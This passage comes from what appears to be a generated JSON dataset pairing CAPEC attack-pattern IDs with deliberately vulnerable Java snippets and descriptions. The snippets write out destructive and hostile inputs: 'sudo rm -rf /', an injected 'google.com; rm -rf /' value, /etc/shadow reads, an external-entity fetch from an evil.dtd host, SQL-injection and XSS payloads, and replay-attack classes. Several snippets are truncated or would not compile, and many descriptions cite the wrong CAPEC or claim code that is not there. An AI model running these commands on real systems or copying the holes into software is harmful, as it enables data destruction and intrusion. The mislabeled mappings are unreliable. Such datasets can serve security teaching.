targetProtocol);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of privilege escalation by exploiting weaknesses in privilege management, hardware logic, fabric bridges, isolation, and handling of insufficient privileges. It showcases how an unauthorized user can gain elevated privileges and perform actions they are not supposed to be authorized to perform."
    },
    {
        "capec_id": "234",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class ElevatedPrivileges {\n    public static void main(String[] args) {\n        try {\n            // CWE-732: Incorrect Permission Assignment for Critical Resource\n            File file = new File(\"/etc/shadow\");\n            if (file.setReadable(true, false)) {\n                System.out.println(\"File permissions changed successfully.\");\n            }\n\n            // CWE-648: Incorrect Use of Privileged APIs\n            Runtime.getRuntime().exec(\"sudo rm -rf /\");\n\n            // CWE-250: Execution with Unnecessary Privileges\n            Process process = Runtime.getRuntime().exec(\"sudo bash\");\n            process.waitFor();\n\n            // CWE-114: Process Control\n            String[] commands = {\"sudo\", \"-u\", \"root\", \"bash\"};\n            Process p = new ProcessBuilder(commands).start();\n            p.waitFor();\n\n            // CWE-271: Privilege Dropping / Lowering Errors\n            System.setSecurityManager(null);\n        } catch (IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of gaining control of a process with elevated privileges to execute arbitrary code. It includes multiple CWEs: CWE-732 (incorrect permission assignment), CWE-648 (incorrect use of privileged APIs), CWE-250 (execution with unnecessary privileges), CWE-114 (process control), and CWE-271 (privilege dropping/lowering errors). The code attempts to change file permissions, execute privileged commands, and start new processes with elevated privileges, all of which can lead to security vulnerabilities."
    },
    {
        "capec_id": "235",
        "code_snippet": "public class VulnerableServer {\n    private static boolean isAdmin = false;\n    private static String adminToken = \"\";\n\n    public static void authenticate(String token) {\n        if (token.equals(adminToken)) {\n            isAdmin = true;\n        }\n    }\n\n    public static void performAdminAction() {\n        if (isAdmin) {\n            // perform admin action\n            System.out.println(\"Admin action performed\");\n        }\n    }\n\n    public static void main(String[] args) {\n        new Thread(new Runnable() {\n            public void run() {\n                // simulate IOCTL with insufficient access control\n                performAdminAction();\n            }\n        }).start();\n\n        try {\n            Thread.sleep(1000);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n\n        // simulate capture-replay attack\n        authenticate(adminToken);\n        performAdminAction();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable server that can be exploited using a capture-replay attack to bypass authentication and gain admin privileges. The server uses a static variable to store the admin token, which can be sniffed and replayed by an attacker. Additionally, the server performs an admin action in a separate thread, which can be accessed without proper access control, similar to an exposed IOCTL. The code also contains a state synchronization error, as the isAdmin variable is not properly synchronized between threads."
    },
    {
        "capec_id": "236",
        "code_snippet": "import java.io.IOException;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"localhost\", 8080);\n            // CWE-294: Authentication Bypass by Capture-replay\n            // Sniffing network traffic and replaying it to bypass authentication\n            byte[] sniffedData = sniffNetworkTraffic();\n            socket.getOutputStream().write(sniffedData);\n            socket.getOutputStream().flush();\n\n            // CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe\n            // Signal handler with non-asynchronous-safe code\n            Runtime.getRuntime().addShutdownHook(new Thread() {\n                public void run() {\n                    try {\n                        // Non-asynchronous-safe code\n                        Thread.sleep(1000);\n                    } catch (InterruptedException e) {\n                        // CWE-391: Unchecked Error Condition\n                        // Ignoring exceptions and error conditions\n                    }\n                }\n            });\n\n            // CWE-782: Exposed IOCTL with Insufficient Access Control\n            // IOCTL with insufficient access control\n            ioctl(socket, 0x1234, \"restricted_operation\");\n        } catch (UnknownHostException e) {\n            // CWE-391: Unchecked Error Condition\n            // Ignoring exceptions and error conditions\n        } catch (IOException e) {\n            // CWE-391: Unchecked Error Condition\n            // Ignoring exceptions and error conditions\n        }\n    }\n\n    // CWE-592: DEPRECATED: Authentication Bypass Issues\n    // Deprecated authentication bypass issue\n    @Deprecated\n    public static void deprecatedAuthBypass() {\n        // Authentication bypass code\n    }\n\n    // CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe\n    // IOCTL with insufficient access control\n    private static native void ioctl(Socket socket, int command, String arg);\n\n    // CWE-294: Authentication Bypass by Capture-replay\n    // Sniffing network traffic\n    private static byte[] sniffNetworkTraffic() {\n        // Sniffing code\n        return new byte[0];\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable code that embodies the main idea of the deprecated CAPEC, incorporating related CWEs. It includes a capture-replay authentication bypass, a signal handler with non-asynchronous-safe code, an exposed IOCTL with insufficient access control, and unchecked error conditions. Note that this code is for demonstration purposes only and should not be used in production."
    },
    {
        "capec_id": "237",
        "code_snippet": "public class SandboxEscape {\n    public native int accessNativeCode();\n    public static void main(String[] args) {\n        SandboxEscape se = new SandboxEscape();\n        int result = se.accessNativeCode();\n        System.out.println(\"Result: \" + result);\n    }\n    static {\n        System.loadLibrary(\"nativecode\");\n    }\n}\n\n// Native code in C\n#include <jni.h>\n#include <stdio.h>\n\nJNIEXPORT jint JNICALL Java_SandboxEscape_accessNativeCode(JNIEnv *env, jobject obj) {\n    // Call system call to read sensitive information\n    FILE *file = fopen(\"/etc/shadow\", \"r\");\n    if (file != NULL) {\n        printf(\"Accessed sensitive information!\\n\");\n        fclose(file);\n        return 1;\n    } else {\n        printf(\"Failed to access sensitive information!\\n\");\n        return 0;\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of escaping a sandbox by calling native C code through JNI, which can perform unsafe operations. The Java code loads a native library and calls a native method, which accesses sensitive information by reading the /etc/shadow file. This code embodies CWE-693 (Protection Mechanism Failure), CWE-111 (Direct Use of Unsafe JNI), and CWE-492 (Use of Inner Class Containing Sensitive Data)."
    },
    {
        "capec_id": "238",
        "code_snippet": "public class InsecureAuthorization {\n    private static final String ADMIN_ROLE = \"admin\";\n    private static final String USER_ROLE = \"user\";\n\n    public void accessResource(String role, String url) {\n        if (role.equals(ADMIN_ROLE)) {\n            // Check authorization before parsing URL\n            if (url.startsWith(\"/admin/\")) {\n                // Insecurely parse URL without canonicalization\n                String[] urlParts = url.split(\"/\");\n                if (urlParts.length > 2) {\n                    String resource = urlParts[2];\n                    // Always-inorrect control flow implementation\n                    if (resource.equals(\"delete\")) {\n                        System.out.println(\"Deleting resource...\");\n                    } else {\n                        System.out.println(\"Access granted.\");\n                    }\n                } else {\n                    System.out.println(\"Access denied.\");\n                }\n            } else {\n                System.out.println(\"Access denied.\");\n            }\n        } else if (role.equals(USER_ROLE)) {\n            // Insufficient isolation of symbolic constant definitions\n            String userResource = \"userResource\";\n            if (url.startsWith(\"/user/\" + userResource)) {\n                System.out.println(\"Access granted.\");\n            } else {\n                System.out.println(\"Access denied.\");\n            }\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the deprecated CAPEC attack pattern, which involves incorrect behavior order, authorization before parsing and canonicalization, insufficient isolation of symbolic constant definitions, violation of secure design principles, always-inorrect control flow implementation, and improper protection of alternate paths. The code checks for authorization before parsing the URL, and then insecurely parses the URL without canonicalization. It also defines symbolic constants in an insufficiently isolated manner, and contains an always-inorrect control flow implementation. Furthermore, the code violates secure design principles and improperly protects alternate paths."
    },
    {
        "capec_id": "239",
        "code_snippet": "public class ClientSideAuthenticator {\n    public boolean authenticate(String username, String password) {\n        // Client-side authentication, no server-side validation\n        if (username.equals(\"admin\") && password.equals(\"password\")) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    public void performSensitiveAction() {\n        // No server-side check, relies on client-side authentication\n        System.out.println(\"Performing sensitive action...\");\n    }\n}\n\npublic class Client {\n    public static void main(String[] args) {\n        ClientSideAuthenticator authenticator = new ClientSideAuthenticator();\n        // Bypass authentication by modifying the client\n        authenticator.performSensitiveAction();\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC-207 pattern by implementing client-side authentication without server-side validation, making it vulnerable to authentication bypass. The ClientSideAuthenticator class performs authentication on the client-side, but the server-side does not validate the authentication. The Client class demonstrates how an attacker can bypass the authentication by modifying the client to directly call the sensitive action method. This code is vulnerable to CWE-603: Use of Client-Side Authentication and CWE-602: Client-Side Enforcement of Server-Side Security."
    },
    {
        "capec_id": "240",
        "code_snippet": "public class ResourceModifier {\n    public void modifyResource(String resourceId, String newIndex) {\n        String resourceName = \"resource\" + resourceId;\n        int index = Integer.parseInt(newIndex);\n        if (index >= 0) {\n            // No validation on resourceId, allowing an attacker to specify an arbitrary resource\n            // No validation on newIndex, allowing an attacker to specify an arbitrary index\n            // Dynamically-managed code resource (variable 'resourceName') is not properly restricted\n            Object resource = getResourceManager().getResource(resourceName);\n            if (resource != null) {\n                // Improper control of resource identifiers, allowing an attacker to modify unintended resources\n                resource.setIndex(index);\n            }\n        }\n    }\n\n    private ResourceManager getResourceManager() {\n        // Improper input validation, allowing an attacker to specify an arbitrary resource manager\n        return (ResourceManager) Class.forName(\"com.example.\" + System.getProperty(\"resourceManager\")).newInstance();\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting weaknesses in input validation by manipulating resource identifiers, enabling the unintended modification or specification of a resource. It incorporates CWEs 99, 1285, 1289, 913, and 20. The code lacks proper input validation, allowing an attacker to specify arbitrary resource identifiers, indices, and resource managers, leading to unintended resource modifications."
    },
    {
        "capec_id": "241",
        "code_snippet": "import java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\n\npublic class CodeInjection {\n    public static void main(String[] args) throws Exception {\n        String className = \"java.lang.Runtime\";\n        String methodName = \"getRuntime\";\n        String execMethod = \"exec\";\n        String command = \"calc\";\n\n        Class<?> clazz = Class.forName(className);\n        Constructor<?> constructor = clazz.getConstructor();\n        Object obj = constructor.newInstance();\n\n        Method method = clazz.getMethod(methodName);\n        Object runtime = method.invoke(obj);\n\n        Method exec = clazz.getMethod(execMethod, String.class);\n        exec.invoke(runtime, command);\n    }\n}",
        "description": "This Java code snippet demonstrates code injection by dynamically loading a class and invoking its methods to execute a system command. It uses deprecated or obsolete functions (CWE-477) and dynamic class loading (CWE-545), which can lead to authentication bypass issues (CWE-592) and incorrect initialization (CWE-458). The code also consumes uncontrolled file descriptors (CWE-769) and uses obsolete functions, making it vulnerable to code injection attacks (CAPEC-242)."
    },
    {
        "capec_id": "242",
        "code_snippet": "public class VulnerableCode {\n    public void executeCommand(String userInput) {\n        String command = \"ping -c 1 \" + userInput;\n        try {\n            Runtime.getRuntime().exec(command);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    public static void main(String[] args) {\n        VulnerableCode vc = new VulnerableCode();\n        vc.executeCommand(\"google.com; rm -rf /\");\n    }\n}",
        "description": "This Java code snippet demonstrates code injection vulnerability (CWE-94) where user input is directly used to construct a system command without proper validation or sanitization, allowing an attacker to inject malicious code. In this example, the `executeCommand` method takes user input and appends it to a `ping` command, which can be exploited to execute arbitrary system commands. The `main` method demonstrates how an attacker can inject a malicious command to delete files on the system."
    },
    {
        "capec_id": "243",
        "code_snippet": "public class XSSVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String userInput = req.getParameter(\"userInput\");\n        String html = \"<a href='' style='background-image: url(\"javascript:alert('XSS');\");'>Click me!</a>\";\n        if (userInput != null) {\n            html = html.replace(\"'', userInput);\n        }\n        resp.setContentType(\"text/html\");\n        PrintWriter out = resp.getWriter();\n        out.println(html);\n    }\n}",
        "description": "This Java servlet is vulnerable to cross-site scripting (XSS) due to improper neutralization of script in attributes in a web page (CWE-83). It takes user input and injects it into an HTML attribute without proper sanitization, allowing an attacker to inject malicious JavaScript code. The code snippet demonstrates how an attacker can inject a JavaScript alert box with the text 'XSS' when the user clicks on the link."
    },
    {
        "capec_id": "244",
        "code_snippet": "public class VulnerableCode {\n    public void generateVulnerableHTML(String userInput) {\n        String base64EncodedPayload = \"<script>alert('XSS')</script>\";\n        String maliciousURI = \"data:text/html;base64,\" + base64EncodedPayload;\n        String html = \"<a href='\" + maliciousURI + \"'>Click me!</a>\";\n        // Output the HTML to the user\n        System.out.println(html);\n    }\n    public static void main(String[] args) {\n        VulnerableCode vc = new VulnerableCode();\n        vc.generateVulnerableHTML(\"<script>alert('XSS')</script>\");\n    }\n}",
        "description": "This Java code snippet generates an HTML anchor tag with a malicious URI in the HREF attribute. The malicious URI contains a base64 encoded HTML content with an embedded cross-site scripting payload. When the browser interprets the malicious content, the XSS payload is executed. This code embodies the CAPEC and CWEs by not neutralizing the user-controlled input, allowing the malicious URI to be injected into the HTML attribute."
    },
    {
        "capec_id": "245",
        "code_snippet": "public class XSSVulnerableServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String userInput = req.getParameter(\"userInput\");\n        String htmlResponse = \"<html><body><h1>Hello, \" + userInput + \"!</h1></body></html>\";\n        resp.setContentType(\"text/html\");\n        resp.getWriter().write(htmlResponse);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to a doubled character XSS attack. The servlet takes user input from a GET request and injects it into an HTML response without proper validation or neutralization, allowing an attacker to inject malicious script tags by doubling characters, such as <<script or %3C%3script using URI encoding."
    },
    {
        "capec_id": "246",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n        String userInput = req.getParameter(\"input\");\n        String html = \"<img src='\" + userInput + \"' onerror='alert(1)' />\";\n        res.setContentType(\"text/html\");\n        res.getWriter().write(html);\n    }\n}\n\npublic class FlashParameterServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n        String userInput = req.getParameter(\"input\");\n        res.setContentType(\"application/x-shockwave-flash\");\n        res.getWriter().write(\"<object><param name='flashVars' value='\" + userInput + \"' /></object>\");\n    }\n}",
        "description": "This Java code snippet demonstrates a stored XSS vulnerability. The first servlet, VulnerableServlet, takes user input and injects it into an HTML IMG tag without proper sanitization, allowing for script injection. The second servlet, FlashParameterServlet, takes user input and injects it into a Flash parameter, which can also lead to script injection. This code combines CWE-692 (incomplete denylist), CWE-87 (improper neutralization of alternate XSS syntax), CWE-942 (permissive cross-domain policy), CWE-85 (doubled character XSS manipulations), and CWE-82 (improper neutralization of script in attributes of IMG tags)."
    },
    {
        "capec_id": "247",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        String html = \"<div id='\" + userInput + \"'>\";\n        response.getWriter().write(html);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to XSS attacks due to improper neutralization of invalid characters in identifiers. The servlet takes user input and injects it directly into an HTML tag without proper sanitization, allowing an attacker to inject malicious script tags and bypass filtering."
    },
    {
        "capec_id": "248",
        "code_snippet": "public class VulnerableCommandExecutor {\n    public void executeCommand(String userInput) {\n        String command = \"ping -c 1 \" + userInput + \" > output.txt\";\n        try {\n            Runtime.getRuntime().exec(command);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet is vulnerable to command injection (CWE-78). The `executeCommand` method takes a `userInput` string and concatenates it with a command string to create a new command. The `Runtime.getRuntime().exec(command)` method then executes the modified command. An attacker can inject malicious commands by providing specially crafted input, such as `; rm -rf /` or `& touch malicious_file`, which can lead to unintended system modifications or data loss."
    },
    {
        "capec_id": "249",
        "code_snippet": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.util.Scanner;\n\npublic class TerminalDeviceManipulation {\n    public static void main(String[] args) {\n        String userInput = \"\";\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter a command:\");\n        userInput = scanner.nextLine();\n\n        try {\n            Process process = Runtime.getRuntime().exec(userInput);\n            InputStream inputStream = process.getInputStream();\n            OutputStream outputStream = process.getOutputStream();\n\n            int c;\n            while ((c = inputStream.read()) != -1) {\n                System.out.write(c);\n            }\n\n            outputStream.write(userInput.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC-40 attack pattern, which involves manipulating writeable terminal devices. The code takes user input and executes it as a command using the Runtime.getRuntime().exec() method, without properly sanitizing the input. This allows an attacker to inject malicious commands, potentially leading to command injection (CWE-77, CWE-78) or authentication bypass (CWE-294) vulnerabilities. Additionally, the code's use of user input to construct a command makes it vulnerable to injection attacks (CWE-74)."
    },
    {
        "capec_id": "250",
        "code_snippet": "import javax.xml.xpath.XPath; import javax.xml.xpath.XPathConstants; import javax.xml.xpath.XPathExpression; import javax.xml.xpath.XPathFactory; import org.w3c.dom.Document; import org.w3c.dom.NodeList; import org.xml.sax.InputSource; public class XMLInjection { public static void main(String[] args) throws Exception { String userInput = \"' or 1=1 or '\"; // user-controllable input String xpathExpression = \"/employees/employee[name='\" + userInput + \"']\"; XPathFactory xpathFactory = XPathFactory.newInstance(); XPath xpath = xpathFactory.newXPath(); Document document = /* assume a Document object is created */; XPathExpression expr = xpath.compile(xpathExpression); NodeList nodes = (NodeList) expr.evaluate(document, XPathConstants.NODESET); // process the result } }",
        "description": "This Java code snippet demonstrates XML injection vulnerability. It takes user input and uses it to construct an XPath expression to query an XML database. The input is not properly validated or neutralized, allowing an attacker to inject malicious XPath syntax, potentially leading to unauthorized data access or modification."
    },
    {
        "capec_id": "251",
        "code_snippet": "public class VulnerableApp {\n    public static void main(String[] args) {\n        String libPath = System.getProperty(\\",
        "description": "This Java code snippet demonstrates the CAPEC of forcing an application to load arbitrary code files from the local machine. It includes CWEs such as inclusion of functionality from an untrusted control sphere (CWE-829), excessive reliance on global variables (CWE-1108), embedded malicious code (CWE-506), improper control of dynamically-managed code resources (CWE-913), and reliance on machine-dependent data representation (CWE-1102). The code loads a DLL file from the user's home directory, uses global variables to store sensitive data, dynamically loads and executes code from untrusted sources, and relies on machine-dependent data representation. It also includes embedded malicious code that can be executed under certain conditions."
    },
    {
        "capec_id": "252",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport javax.servlet.http.Part;\n\npublic class VulnerablePHPFileLoader {\n    public void loadPHPFile(String filename) throws IOException {\n        File file = new File(filename);\n        if (file.exists()) {\n            FileInputStream fis = new FileInputStream(file);\n            // execute the PHP file contents\n            String phpCode = new String(fis.readAllBytes());\n            // assume a PHP executor is available\n            PHPExecutor executor = new PHPExecutor();\n            executor.execute(phpCode);\n        }\n    }\n\n    public void uploadFile(Part filePart) throws IOException {\n        String filename = filePart.getSubmittedFileName();\n        File file = new File(filename);\n        filePart.write(filename);\n        loadPHPFile(filename);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable PHP file loader that allows an attacker to load and execute arbitrary local PHP files. The `loadPHPFile` method takes a filename as input and executes the PHP file contents using a hypothetical `PHPExecutor` class. The `uploadFile` method allows an attacker to upload a PHP file and then loads and executes it using the `loadPHPFile` method. This code embodies the CAPEC and CWEs by allowing an attacker to include functionality from an untrusted control sphere (CWE-829), improperly controlling the filename for inclusion (CWE-98), relying on the file name or extension of an externally-supplied file (CWE-646), incompletely identifying uploaded file variables (CWE-616), and modifying external variables (CWE-473)."
    },
    {
        "capec_id": "253",
        "code_snippet": "import java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class VulnerableCode {\n    public static void main(String[] args) throws Exception {\n        String url = \\",
        "description": "This Java code snippet demonstrates the CAPEC of loading arbitrary code files from a remote location. It uses a URLClassLoader to load a JAR file from a remote URL, which could potentially contain malicious code. This code embodies CWE-829 by including functionality from an untrusted control sphere, CWE-494 by downloading code without integrity checks, and CWE-506 by potentially including embedded malicious code. CWE-602 and CWE-540 are not directly applicable in this example, but the code could be modified to include sensitive information in the source code or rely on client-side enforcement of server-side security."
    },
    {
        "capec_id": "254",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\n\npublic class DTDInjection {\n    public static void main(String[] args) throws Exception {\n        String xml = \"<?xml version=\\\"1.0\\\" encoding=\\\"ISO-8859-1\\\"?>\\n\" +\n                \"<!DOCTYPE foo [\\n\" +\n                \"<!ENTITY xxe SYSTEM \\\"http://example.com/evil.dtd\\\">\\n\" +\n                \"<!ELEMENT foo ANY >\\n\" +\n                \"<!ATTLIST foo foo CDATA foo >\\n\" +\n                \"]>\\n\" +\n                \"<foo>&xxe;</foo>\";\n\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        Document document = builder.parse(new InputSource(new java.io.StringReader(xml)));\n    }\n}",
        "description": "This Java code snippet demonstrates DTD Injection (CAPEC-228) by parsing an XML document with an embedded DTD that references an external entity. The code does not restrict the DTD reference to the intended control sphere, allowing an attacker to reference arbitrary DTDs (CWE-827). Additionally, the code does not properly control the number of recursive definitions of entities, making it vulnerable to XML Entity Expansion (CWE-776)."
    },
    {
        "capec_id": "256",
        "code_snippet": "public class SOAPRequestProcessor {\n    public void processSOAPRequest(byte[] request) {\n        int arrayLength = request[0]; // assume the first byte of the request specifies the length of the array\n        byte[] array = new byte[arrayLength];\n        System.arraycopy(request, 1, array, 0, request.length - 1); // incorrect length value used\n        // process the array\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable SOAP request processor that is susceptible to a buffer overflow attack. The processor trusts the length value specified in the request and uses it to allocate a buffer, without verifying that the actual length of the request data matches the specified length. This can lead to a buffer overflow if the attacker specifies a smaller length value than the actual length of the data."
    },
    {
        "capec_id": "257",
        "code_snippet": "public class DataStorage {\n    public static void storeData(String data) {\n        // CWE-217: Failure to Protect Stored Data from Modification\n        // CWE-766: Critical Data Element\n        // CWE-767: Access Control for Sensitive Data\n        String filePath = \"data.txt\";\n        try (BufferedWriter writer = new BufferedWriter(new FileWriter(filePath))) {\n            writer.write(data);\n        } catch (IOException e) {\n            System.out.println(\"Error writing to file: \" + e.getMessage());\n        }\n    }\n\n    public static String retrieveData() {\n        // CWE-218: Failure to provide confidentiality for stored data\n        // CWE-493: Sensitive Data Exposure\n        String filePath = \"data.txt\";\n        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {\n            return reader.readLine();\n        } catch (IOException e) {\n            System.out.println(\"Error reading from file: \" + e.getMessage());\n            return null;\n        }\n    }\n\n    public static void logDebugInfo(String info) {\n        // CWE-534: Information Exposure Through Debug Log Files\n        // CWE-532: Information Exposure Through Log Files\n        String logPath = \"debug.log\";\n        try (BufferedWriter writer = new BufferedWriter(new FileWriter(logPath, true))) {\n            writer.write(info);\n        } catch (IOException e) {\n            System.out.println(\"Error writing to log file: \" + e.getMessage());\n        }\n    }\n\n    public static boolean authenticateUser(String username, String password) {\n        // CWE-592: Authentication Bypass Issues\n        // CWE-287: Improper Authentication\n        // Always return true for demonstration purposes\n        return true;\n    }\n\n    public static void logServerInfo(String info) {\n        // CWE-533: Information Exposure Through Server Log Files\n        // CWE-532: Information Exposure Through Log Files\n        String logPath = \"server.log\";\n        try (BufferedWriter writer = new BufferedWriter(new FileWriter(logPath, true))) {\n            writer.write(info);\n        } catch (IOException e) {\n            System.out.println(\"Error writing to log file: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates deprecated CAPEC and CWE patterns, including failure to protect stored data from modification, failure to provide confidentiality for stored data, information exposure through debug and server log files, and authentication bypass issues."
    },
    {
        "capec_id": "258",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\n\npublic class CaptureReplayAttack {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        // Sniffing network traffic\n        byte[] sniffedData = new byte[1024];\n        in.read(sniffedData);\n\n        // Replay the sniffed data to bypass authentication\n        out.write(sniffedData);\n        out.flush();\n\n        // Call to non-ubiquitous API (e.g., using a platform-specific function)\n        Runtime.getRuntime().exec(\"platform-specific-command\");\n\n        // Using client-side authentication\n        boolean isAuthenticated = authenticateClientSide();\n        if (isAuthenticated) {\n            // Perform actions that should be restricted\n            System.out.println(\"Access granted!\");\n        }\n    }\n\n    // Client-side authentication function\n    private static boolean authenticateClientSide() {\n        // Weak authentication logic\n        return true;\n    }\n}\n",
        "description": "This Java code snippet demonstrates a capture-replay attack, which is a type of authentication bypass. It sniffs network traffic, replays the sniffed data to bypass authentication, and uses client-side authentication. Additionally, it calls a non-ubiquitous API, which can cause portability issues. This code is vulnerable to CWE-294, CWE-589, and CWE-603."
    },
    {
        "capec_id": "259",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\n\npublic class AuthenticationBypass {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataInputStream dis = new DataInputStream(socket.getInputStream());\n        DataOutputStream dos = new DataOutputStream(socket.getOutputStream());\n\n        // Capture authentication request\n        byte[] request = new byte[1024];\n        dis.read(request);\n        String authRequest = new String(request);\n\n        // Replay authentication request\n        dos.writeBytes(authRequest);\n        dos.flush();\n\n        // Bypass authentication\n        dos.writeBytes(\"Authentication successful!\\n\");\n        dos.flush();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a capture-replay attack, which is a type of authentication bypass. It captures an authentication request, replays it to the server, and then bypasses the authentication check. This is a vulnerable code snippet that embodies the main idea of the deprecated CAPEC, which is a duplicate of CAPEC-65: Sniff Application Code. The related CWEs, such as CWE-294: Authentication Bypass by Capture-replay, CWE-603: Use of Client-Side Authentication, and CWE-589: Call to Non-ubiquitous API, provide additional context for this vulnerability."
    },
    {
        "capec_id": "260",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\n\npublic class AuthenticationBypass {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        // Capture authentication data\n        String authData = in.readUTF();\n\n        // Replay authentication data to bypass authentication\n        out.writeUTF(authData);\n        out.flush();\n\n        // Perform actions that require authentication\n        out.writeUTF(\"performSensitiveAction\");\n        out.flush();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a capture-replay attack (CWE-294) to bypass authentication. It connects to a server, captures the authentication data, and replays it to the server to gain unauthorized access. The server-side authentication is assumed to be weak, allowing the client-side authentication (CWE-603) to be bypassed. The code also uses a non-ubiquitous API (CWE-589) by assuming the availability of a specific socket implementation."
    },
    {
        "capec_id": "261",
        "code_snippet": "public class VulnerableQuery {\n    public static void main(String[] args) {\n        String userInput = \"' OR 1=1 --\";\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n        try {\n            Statement stmt = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"root\", \"password\").createStatement();\n            ResultSet result = stmt.executeQuery(query);\n            while (result.next()) {\n                System.out.println(result.getString(\"username\") + \": \" + result.getString(\"password\"));\n            }\n        } catch (SQLException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable query that is susceptible to SQL injection. The userInput variable is not properly validated, allowing an attacker to inject malicious SQL code. The query is then executed, potentially returning sensitive information. If an error occurs, the error message is printed, which may contain sensitive information about the environment or associated data."
    },
    {
        "capec_id": "263",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class VulnerableFileProcessor {\n    public static void processFile(String filePath) throws IOException {\n        File file = new File(filePath);\n        if (file.exists()) {\n            FileInputStream fis = new FileInputStream(file);\n            FileOutputStream fos = new FileOutputStream(\\",
        "description": "This Java code snippet demonstrates a vulnerable file processing functionality that can be exploited by an attacker to cause a denial of service or other malicious effects. The code reads a file specified by the user and writes its contents to another file. The file path is not validated, allowing an attacker to provide a corrupted or malicious file that can cause the application to crash or behave unexpectedly. The code also uses insecure temporary files and relies on the file name and extension to determine its behavior, making it vulnerable to CWE-377, CWE-646, and CWE-434. Additionally, the code does not properly handle Windows alternate data streams, making it vulnerable to CWE-69. The inclusion of functionality from an untrusted control sphere (CWE-829) is also a concern, as the code may be importing or requiring executable functionality from an external source."
    },
    {
        "capec_id": "264",
